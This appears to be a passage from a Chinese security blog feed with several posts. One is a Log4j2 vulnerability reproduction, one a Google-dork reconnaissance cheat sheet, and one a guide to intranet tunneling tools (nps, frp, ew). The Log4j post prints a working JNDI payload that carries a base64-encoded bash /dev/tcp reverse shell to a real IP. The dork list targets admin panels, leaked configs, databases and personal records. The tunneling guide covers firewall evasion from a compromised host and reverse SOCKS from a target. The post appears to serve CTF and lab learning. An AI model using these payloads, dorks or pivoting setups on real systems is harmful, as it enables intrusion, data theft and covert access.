src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230227123916565.png" alt="image-20230227123916565"></p><p>输入检测payload</p><p>${jndi:ldap://1m2ux1.dnslog.cn}</p><p><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230227124228459.png" alt="image-20230227124228459"></p><p>发现一条访问记录，说明漏洞存在</p><p><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/3040181-20221118132302804-1532498878.png" alt="img"></p><h3 id="漏洞利用-2">漏洞利用</h3><p>下载jar包 JNDIExploit-1.2-SNAPSHOT.jar</p><p>这个jar包拥有很多JNDI注入payload，能够将自己的服务器仿造成ldap服务器</p><p>启动jar包，利用nc反弹shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs SHELL">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i ip -p 2333<br></code></pre></td></tr></table></figure><p><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230227124448557.png" alt="image-20230227124448557"></p><p>再开一个终端，开启nc监听</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nc -lvp 1099<br></code></pre></td></tr></table></figure><p><img src="/2023/03/02/%E5%A4%8D%E7%8E%B0log4j2/image-20230227124545252.png" alt="image-20230227124545252"></p><p>制作poc，通过bash -i &gt;&amp; /dev/tcp/x.x.x.x/1099 0&gt;&amp;1反弹shell</p><p>bash -i &gt;&amp; /dev/tcp/120.77.151.110/1099 0&gt;&amp;1</p><p>说明：</p><blockquote><p>bash -i 指开启一个交互式的Shell</p><p>&amp;符号用于区分文件和文件描述符</p><p>&amp;表示标准输出或标准错误输出重定向到文件</p><p>0指标准输入重定向，1指标准输出重定向，2指错误输出重定向</p><p>/dev/tcp指linux下的特殊设备，可用于建立Socket连接</p><p>bash -i &gt;&amp; /dev/tcp/120.x.7x.2x.17x/5555 0&gt;&amp;1  指将标准输出重定向到/dev/tcp/ip/port端口文件中即重定向到攻击机，靶机的标准输入被重定向到了标准输出，标准输出重定向到了攻击机，因此标准输入也就重定向到了攻击机，所以可以看到攻击机输入命令并看到结果。</p></blockquote><p>POC为：</p><p>bash -i &gt;&amp; /dev/tcp/120.77.151.110/10001 0&gt;&amp;1</p><p>base64编码后：YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzcuMTUxLjExMC8xMDAwMSAwPiYx</p><p>Url编码后：</p><p>YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjAuNzcuMTUxLjExMC8xMDAwMSAwPiYx</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">$&#123;jndi:ldap://120.77.151.110:1389/TomcatBypass/Command/Base64//YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjAuNzcuMTUxLjExMC8xMDAwMSAwPiYx&#125;<br></code></pre></td></tr></table></figure><p>将payload注入后shell会被反彈到nc监听的端口上</p><p>拿到shell后cd到根目录ls看到flag</p><p>cat之即可拿到flag</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf</title>
      <link href="/2023/02/27/buuctf/"/>
      <url>/2023/02/27/buuctf/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="c672feff01b7a4ef2350a285bcebc77ae553f4c079a4f684409b5f6b506a8119"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">实验室内部查看。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>谷歌语法</title>
      <link href="/2023/02/18/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/"/>
      <url>/2023/02/18/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1>谷歌语法</h1><h2 id="一、是什么">一、是什么</h2><blockquote><p>谷歌语法就是利用搜索引擎在<a href="https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&amp;spm=1001.2101.3001.7020">渗透测试</a>过程搜索到特定页面的一种语法</p></blockquote><h5 id="谷歌一般需要搜索的信息">谷歌一般需要搜索的信息</h5><p>A.网站注册信息<br>B.网管资料<br>C.共享资料<br>D.端口信息<br>E.FTP资源<br>F.网站拓扑结构<br>G.网站URL地址结构<br>H.网站系统版本<br>I.后台地址<br>J.弱口令</p><h2 id="二、如何利用">二、如何利用</h2><h3 id="1、基础符号">1、基础符号</h3><p>+：“xxx” +<a href="http://baidu.com">baidu.com</a> 与百度有关的内容</p><p>-：“xxx” -baidu.com 除去与百度相关的内容</p><p>“？”和“*”：占位通配符，可以匹配其他任意字母和单词</p><p>OR：或指令，或者包含</p><h3 id="2、参数">2、参数</h3><p>site:指定域名</p><p>inurl：用于搜索包含的url关键词的网页</p><p>intitle：搜索网页标题中的关键字</p><p>intext：搜索网页正文中的关键字，如：intext:登陆/注册/用户名/密码</p><p>filetype：按指定文件类型即文件后缀名搜索，如：filetpye:php/asp/jsp</p><p>​                支持的文档有：pdf、ppt、doc、xls、conf、inc、mdb等；网页文件：htm、asp、php等</p><p>cache：已经删除的缓存网页，推荐组合使用</p><p>info：查看指定站点的基本信息</p><p>related：搜索相关信息</p><p>link：搜索所有链接到某个特定url的页面</p><p>stocks：搜索有关一家公司的股票市场信息</p><p>insubject：搜索Google组的标题行</p><p>msgid：搜索识别新闻组帖子的Google组信息标识符和字符串</p><p>group：搜索Googl组搜索词汇帖子的题目</p><p>bphonebook：仅搜索商业电话号</p><p>rphonebook：仅搜索住宅电话号码</p><p>phonebook：搜索商业或者住宅电话号码薄</p><p>daterange：搜索某个日期范围内Goole所索引的网页</p><p>inanchor：搜索一个HTML标记中的一个链接的文本表现形式</p><h3 id="典型姿势">典型姿势</h3><h4 id="查找后台">查找后台</h4><p>site:域名 intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system<br>site:域名 inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend<br>site:域名 intitle:管理 | 后台 | 后台管理 | 登陆 | 登录</p><h4 id="查找sql注入漏洞">查找sql注入漏洞</h4><p>site:域名 inurl:.aspx|jsp|php|asp?id=</p><h4 id="查找上传点：">查找上传点：</h4><p>site:xx.com inurl:file| uploadfile</p><h4 id="查找上传漏洞">查找上传漏洞</h4><p>site:域名 inurl:file|load|editor|Files</p><p>site:域名 inurl:upload</p><h4 id="找eweb编辑器：">找eweb编辑器：</h4><p>site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit</p><h4 id="目录遍历漏洞"><strong>目录遍历漏洞</strong></h4><p>site:域名 intitle:index.of</p><h4 id="SQL错误"><strong>SQL错误</strong></h4><p>site:域名 intext:”sql syntax near” | intext:”syntax error has occurred” | intext:”incorrect syntax near” | intext:”unexpected end of SQL command” | intext:”Warning: mysql_connect()” | intext:”Warning: mysql_query()” | intext:”Warning: pg_connect()”<br>phpinfo()<br>site:域名 ext:php intitle:phpinfo “published by the PHP Group”</p><h4 id="配置文件泄露">配置文件泄露</h4><p>site:域名 ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</p><h4 id="数据库文件泄露">数据库文件泄露</h4><p>site:域名 ext:.sql | .dbf | .mdb | .db</p><h4 id="日志文件泄露">日志文件泄露</h4><p>site:域名 ext:.log</p><h4 id="备份和历史文件泄露"><strong>备份和历史文件泄露</strong></h4><p>site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</p><h4 id="公开文件泄露">公开文件泄露</h4><p>site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</p><h4 id="邮箱信息">邮箱信息</h4><p>site:target.com <a href="mailto:intext:@target.com">intext:@target.com</a><br>site:target.com 邮件<br>site:target.com email</p><h4 id="社工信息">社工信息</h4><p>site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证</p><h4 id="存在的数据库：">存在的数据库：</h4><p>site:域名 filetype:mdb|asp|</p><h4 id="查看脚本类型：">查看脚本类型：</h4><p>site:域名 filetype:asp/aspx/php/jsp</p><h4 id="迂回策略入侵：">迂回策略入侵：</h4><p>site:域名 filetype:asp/aspx/php/jsp</p><h4 id="查找敏感信息泄露">查找敏感信息泄露</h4><p>intitle:“Index of /admin”</p><p>intitle:“Index of /root”</p><p>intitle:“Index of /” +password.txt</p><p>intitle:phpinfo()或者inurl:phpinfo.php</p><p>查找未授权访问phpmyadmin<br>inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin</p><h2 id="例如">例如</h2><h5 id="搜索敏感文件">搜索敏感文件</h5><p><img src="/2023/02/18/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/image-20220423231838477.png" alt="image-20220423231838477"></p><p>某些学校的.doc文件</p><h5 id="管理后台">管理后台</h5><p><img src="/2023/02/18/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/image-20220423233017452.png" alt="image-20220423233017452"></p><h6 id="在qq-com-中标题中有网络的帖子"><a href="http://xn--qq-rl8c.com">在qq.com</a> 中标题中有网络的帖子</h6><p><img src="/2023/02/18/%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95/image-20220423234627760.png" alt="image-20220423234627760"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几款实用的内网穿透工具</title>
      <link href="/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
      <url>/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1>nps-npc</h1><h2 id="简介">简介</h2><blockquote><p>nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。</p></blockquote><ul><li><p>一台有公网IP的服务器（VPS）运行服务端（NPS）</p></li><li><p>一个或多个运行在内网的服务器或者PC运行客户端（NPC）</p><p><img src="/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/image-20230214081012748.png" alt="image-20230214081012748"></p></li></ul><h2 id="特点">特点</h2><ol><li>Go语言编写</li><li>支持跨平台</li><li>支持多种协议的代理</li><li>web管理端</li></ol><h2 id="使用方法">使用方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">https://github.com/ehang-io/nps/releases<br></code></pre></td></tr></table></figure><h3 id="NPS-服务端">NPS(服务端)</h3><p>需要一台拥有静态公网IP的服务器。国内推荐使用<a href="https://qcloud.com/">腾讯云</a>或<a href="https://aliyun.com/">阿里云</a>，国外推荐<a href="https://www.linode.com/">Linode</a>以及<a href="https://hostus.us/">hostus</a>。</p><p>服务器选购方面，建议购买Linux系统（推荐CentOS6/CentOS7），用作内网穿透的话对CPU性能、内存、以及硬盘容量都没有要求。</p><h4 id="安装配置">安装配置</h4><p>找到自己服务器相应版本的server：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cd ~<br>wget https://github.com/cnlh/nps/releases/download/v0.23.2/linux_amd64_server.tar.gz<br>tar xzvf linux_amd64_server.tar.gz<br>cd ~/nps<br></code></pre></td></tr></table></figure><p>在nps目录下面会有一个nps可执行文件、conf配置目录和web网页目录，我们只需要修改<code>conf/nps.conf</code>即可：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">vim conf/nps.conf  <br></code></pre></td></tr></table></figure><p>需要改一下<code>#web</code>下面的几个参数，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">web_host= 服务器IP或者域名  <br>web_username= admin（登录用户名）  <br>web_password= 你的密码  <br>web_port=8080（web管理端口）  <br></code></pre></td></tr></table></figure><p>修改<code>#bridge</code> 可以更改 NPC的连接端口。比如我们拿到一台权限受限的服务器，有防火墙，可能只有部分端口（80，443）可以出网，就需要修改成出网端口。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">##bridge  <br>bridge_type=tcp  <br>bridge_port=443  # 修改连接端口  <br>bridge_ip=0.0.0.0  <br></code></pre></td></tr></table></figure><h4 id="启动">启动</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#Mac/Linux  <br>./nps test|start|stop|restart|status  测试配置文件|启动|停止|重启|状态  <br>  <br>#Windows  <br>nps.exe test|start|stop|restart|status 测试配置文件|启动|停止|重启|状态  <br></code></pre></td></tr></table></figure><p><img src="/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/image-20230216100017931.png" alt="image-20230216100017931"></p><p>启动后，可以访问网页管理面板（在浏览器中输入&quot;&lt;你服务器的IP或域名&gt;:&lt;网页面板端口&gt;&quot;），如果能打开网页并成功登陆，则说明服务端配置完成。</p><p><img src="/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/image-20230216095959096.png" alt="image-20230216095959096"></p><h3 id="NPC（客户端）">NPC（客户端）</h3><p>以windows为例，windows下载客户端</p><p><img src="/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/image-20230216101443911.png" alt="image-20230216101443911"></p><p>在nps上添加一个客户端</p><p><img src="/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/image-20230216101618722.png" alt="image-20230216101618722"></p><p><img src="/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/image-20230216101715552.png" alt="image-20230216101715552"></p><p>Windows下使用的命令与面板中显示的有所不同，请把&quot;./npc&quot;部分替换为&quot;npc&quot;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">./npc -server=你的IP:8024 -vkey=唯一验证密码 -type=tcp <br></code></pre></td></tr></table></figure><p>./npc.exe -server=120.77.151.110:8024 -vkey=xc4adm11xln25k7f -type=tcp</p><p>我是在gitbash中运行的</p><p><img src="/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/image-20230216102156629.png" alt="image-20230216102156629"></p><p>如果没有报错，可以访问网页管理面板查看客户端是否变为online状态。如进入online状态，则可以添加内网穿透规则。</p><h3 id="web管理端">web管理端</h3><p>在客户端界面可以通过<code>新增</code>的方式添加客户端连接，每一个连接的vkey都是唯一区分的。</p><p>每一个客户端，在建立连接后，都可以建立多个不同协议的隧道，这一个个隧道就是不同的代理了。</p><p><img src="/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/image-20230216110952873.png" alt="image-20230216110952873"></p><p>通过不同的协议和端口就可以连接代理的内网机器。</p><h1>frp</h1><h2 id="简介-2">简介</h2><blockquote><p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</p></blockquote><p><img src="/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/image-20230217085722689.png" alt="image-20230217085722689"></p><ul><li>客户端服务端通信支持 TCP、KCP 以及 Websocket 等多种协议。</li><li>端口复用，多个服务通过同一个服务端端口暴露。</li><li>跨平台，但是支持的比nps少一点</li><li>多种插件，提供很多功能</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">下载：https://github.com/fatedier/frp/releases<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">wget https://github.com/fatedier/frp/releases/download/v0.33.0/frp_0.33.0_linux_amd64.tar.gz<br>tar xzvf frp_0.33.0_linux_amd64.tar.gz<br></code></pre></td></tr></table></figure><h3 id="1-通过-rdp-访问家里的机器">1. 通过 rdp 访问家里的机器</h3><p>1.修改 frps.ini 文件，为了安全起见，这里最好配置一下身份验证，服务端和客户端的 common 配置中的 <code>token</code> 参数一致则身份验证通过：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># frps.ini<br>[common]<br>bind_port = 7000<br># 用于身份验证，请自行修改，要保证服务端与客户端一致<br>token = abcdefgh<br></code></pre></td></tr></table></figure><p>2.启动 frps：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">./frps -c ./frps.ini<br></code></pre></td></tr></table></figure><p><img src="/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/image-20230217100839733.png" alt="image-20230217100839733"></p><p>3.修改 frpc.ini 文件，假设 frps 所在服务器的公网 IP 为 x.x.x.x：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># frpc.ini<br>[common]<br>server_addr = x.x.x.x<br>server_port = 7000<br># 用于身份验证，请自行修改，要保证服务端与客户端一致<br>token = abcdefgh<br><br>[rdp]<br>type = tcp<br>local_ip = 127.0.0.1<br>local_port = 3389<br>remote_port = 6000<br></code></pre></td></tr></table></figure><p>4.启动 frpc：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">./frpc -c ./frpc.ini<br></code></pre></td></tr></table></figure><p>5.通过 rdp 访问远程的机器，地址为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">x.x.x.x:6000<br></code></pre></td></tr></table></figure><h4 id="开机自启">开机自启</h4><p>针对 Windows 系统，为了便于使用，可以配置一下开机的时候静默启动。</p><p>1.在 frpc.exe 的同级目录创建一个 start_frpc.vbs：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#x27;start_frpc.vbs<br>&#x27;请根据实际情况修改路径<br>CreateObject(&quot;WScript.Shell&quot;).Run &quot;&quot;&quot;D:\Program Files\frp_windows_amd64\frpc.exe&quot;&quot;&quot; &amp; &quot;-c&quot; &amp; &quot;&quot;&quot;D:\Program Files\frp_windows_amd64\frpc.ini&quot;&quot;&quot;,0<br></code></pre></td></tr></table></figure><p>2.复制 start_frpc.vbs 文件，打开以下目录，注意将</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;USER_NAME&gt;<br></code></pre></td></tr></table></figure><p>改为你的用户名：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">C:\Users\&lt;USER_NAME&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br></code></pre></td></tr></table></figure><p>3.鼠标右击，粘贴为快捷方式即可。</p><h3 id="2-通过-SSH-访问公司内网机器">2. 通过 SSH 访问公司内网机器</h3><p>frps 的部署步骤同上。</p><p>1.启动 frpc，配置如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># frpc.ini<br>[common]<br>server_addr = x.x.x.x<br>server_port = 7000<br># 用于身份验证，请自行修改，要保证服务端与客户端一致<br>token = abcdefgh<br><br>[ssh]<br>type = tcp<br>local_ip = 127.0.0.1<br>local_port = 22<br>remote_port = 6000<br></code></pre></td></tr></table></figure><p>2.通过 SSH 访问内网机器，假设用户名为 test：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ssh -oPort=6000 test@x.x.x.x<br></code></pre></td></tr></table></figure><h3 id="3-通过自定义域名访问部署于内网的-Web-服务">3. 通过自定义域名访问部署于内网的 Web 服务</h3><p>有时想要让其他人通过域名访问或者测试我们在本地搭建的 Web 服务，但是由于本地机器没有公网 IP，无法将域名解析到本地的机器，通过 frp 就可以实现这一功能，以下示例为 http 服务，https 服务配置方法相同， vhost_http_port 替换为 vhost_https_port， type 设置为 https 即可。</p><p>1.修改 frps.ini 文件，设置 http 访问端口为 8080：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># frps.ini<br>[common]<br>bind_port = 7000<br>vhost_http_port = 8080<br># 用于身份验证，请自行修改，要保证服务端与客户端一致<br>token = abcdefgh<br></code></pre></td></tr></table></figure><p>2.启动 frps：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">./frps -c ./frps.ini<br></code></pre></td></tr></table></figure><p>3.修改 frpc.ini 文件，假设 frps 所在的服务器的 IP 为 x.x.x.x，local_port 为本地机器上 Web 服务对应的端口， 绑定自定义域名 <code>www.yourdomain.com</code>:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># frpc.ini<br>[common]<br>server_addr = x.x.x.x<br>server_port = 7000<br># 用于身份验证，请自行修改，要保证服务端与客户端一致<br>token = abcdefgh<br><br>[web]<br>type = http<br>local_port = 80<br>custom_domains = www.yourdomain.com<br></code></pre></td></tr></table></figure><p>4.启动 frpc：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">./frpc -c ./frpc.ini<br></code></pre></td></tr></table></figure><p>5.将 <code>www.yourdomain.com</code> 的域名 A 记录解析到 IP <code>x.x.x.x</code>，如果服务器已经有对应的域名，也可以将 CNAME 记录解析到服务器原先的域名。</p><p>6.通过浏览器访问 <code>http://www.yourdomain.com:8080</code> 即可访问到处于内网机器上的 Web 服务。</p><h3 id="4-对外提供简单的文件访问服务">4. 对外提供简单的文件访问服务</h3><p>通过 <code>static_file</code> 插件可以对外提供一个简单的基于 HTTP 的文件访问服务。</p><p>frps 的部署步骤同上。</p><p>1.启动 frpc，启用 <code>static_file</code> 插件，配置如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># frpc.ini<br>[common]<br>server_addr = x.x.x.x<br>server_port = 7000<br># 用于身份验证，请自行修改，要保证服务端与客户端一致<br>token = abcdefgh<br><br>[test_static_file]<br>type = tcp<br>remote_port = 6000<br>plugin = static_file<br># 要对外暴露的文件目录<br>plugin_local_path = /tmp/file<br># 访问 url 中会被去除的前缀，保留的内容即为要访问的文件路径<br>plugin_strip_prefix = static<br>plugin_http_user = abc<br>plugin_http_passwd = abc<br></code></pre></td></tr></table></figure><p>2.通过浏览器访问 <code>http://x.x.x.x:6000/static/</code> 来查看位于 <code>/tmp/file</code> 目录下的文件，会要求输入已设置好的用户名和密码。</p><h2 id="常用功能">常用功能</h2><h3 id="统计面板（Dashboard）">统计面板（Dashboard）</h3><p>通过浏览器查看 frp 的状态以及代理统计信息展示。</p><p>注：Dashboard 尚未针对大量的 proxy 数据展示做优化，如果出现 Dashboard 访问较慢的情况，请不要启用此功能。</p><p>需要在 frps.ini 中指定 dashboard 服务使用的端口，即可开启此功能：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[common]<br>dashboard_port = 7500<br># dashboard 用户名密码，默认都为 admin<br>dashboard_user = admin<br>dashboard_pwd = admin<br></code></pre></td></tr></table></figure><p>打开浏览器通过 <code>http://[server_addr]:7500</code> 访问 dashboard 界面，用户名密码默认为 <code>admin</code>。</p><h3 id="加密与压缩">加密与压缩</h3><p>这两个功能默认是不开启的，需要在 frpc.ini 中通过配置来为指定的代理启用加密与压缩的功能，压缩算法使用 snappy：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># frpc.ini<br>[ssh]<br>type = tcp<br>local_port = 22<br>remote_port = 6000<br>use_encryption = true<br>use_compression = true<br></code></pre></td></tr></table></figure><p>如果公司内网防火墙对外网访问进行了流量识别与屏蔽，例如禁止了 SSH 协议等，通过设置 <code>use_encryption = true</code>，将 frpc 与 frps 之间的通信内容加密传输，将会有效防止流量被拦截。</p><p>如果传输的报文长度较长，通过设置 <code>use_compression = true</code> 对传输内容进行压缩，可以有效减小 frpc 与 frps 之间的网络流量，加快流量转发速度，但是会额外消耗一些 CPU 资源。</p><h4 id="TLS">[TLS</h4><p>从 v0.25.0 版本开始 frpc 和 frps 之间支持通过 TLS 协议加密传输。通过在 <code>frpc.ini</code> 的 <code>common</code> 中配置 <code>tls_enable = true</code> 来启用此功能，安全性更高。</p><p>为了端口复用，frp 建立 TLS 连接的第一个字节为 0x17。</p><p>注意：启用此功能后除 xtcp 外，不需要再设置 use_encryption。</p><h3 id="代理限速">代理限速</h3><p>目前支持在客户端的代理配置中设置代理级别的限速，限制单个 proxy 可以占用的带宽。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># frpc.ini<br>[ssh]<br>type = tcp<br>local_port = 22<br>remote_port = 6000<br>bandwidth_limit = 1MB<br></code></pre></td></tr></table></figure><p>在代理配置中增加 <code>bandwidth_limit</code> 字段启用此功能，目前仅支持 <code>MB</code> 和 <code>KB</code> 单位。</p><h3 id="范围端口映射">范围端口映射</h3><p>在 frpc 的配置文件中可以指定映射多个端口，目前只支持 tcp 和 udp 的类型。</p><p>这一功能通过 <code>range:</code> 段落标记来实现，客户端会解析这个标记中的配置，将其拆分成多个 proxy，每一个 proxy 以数字为后缀命名。</p><p>例如要映射本地 6000-6005, 6007 这 6 个端口，主要配置如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># frpc.ini<br>[range:test_tcp]<br>type = tcp<br>local_ip = 127.0.0.1<br>local_port = 6000-6006,6007<br>remote_port = 6000-6006,6007<br></code></pre></td></tr></table></figure><p>实际连接成功后会创建 8 个 proxy，命名为 <code>test_tcp_0, test_tcp_1 ... test_tcp_7</code>。</p><h1>ew</h1><h2 id="简介-3">简介</h2><blockquote><p>EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。但是，现在工具已经不更新了。。。</p></blockquote><p><img src="/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/image-20230217141546947.png" alt="image-20230217141546947"></p><h2 id="使用方法-2">使用方法</h2><p>以下所有样例，如无特殊说明代理端口均为1080，服务均为SOCKSv5代理服务.</p><p>该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）。</p><h3 id="1-正向-SOCKS-v5-服务器">1. 正向 SOCKS v5 服务器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">$ ./ew -s ssocksd -l 1080  <br></code></pre></td></tr></table></figure><h3 id="2-反弹-SOCKS-v5-服务器">2. 反弹 SOCKS v5 服务器</h3><p>这个操作具体分两步：</p><p>a) 先在一台具有公网 ip 的主机A上运行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">$ ./ew -s rcsocks -l 1080 -e 8888   <br></code></pre></td></tr></table></figure><p>b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">$ ./ew -s rssocks -d 1.1.1.1 -e 8888   <br></code></pre></td></tr></table></figure><p>成功。</p><h3 id="3-多级级联">3. 多级级联</h3><p>工具中自带的三条端口转发指令， 它们的参数格式分别为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">$ ./ew -s lcx_listen -l  1080   -e 8888    <br>$ ./ew -s lcx_tran   -l  1080   -f 2.2.2.3 -g 9999    <br>$ ./ew -s lcx_slave  -d 1.1.1.1 -e 8888    -f 2.2.2.3  -g  9999  <br></code></pre></td></tr></table></figure><p>通过这些端口转发指令可以将处于网络深层的基于TCP的服务转发至根前,比如 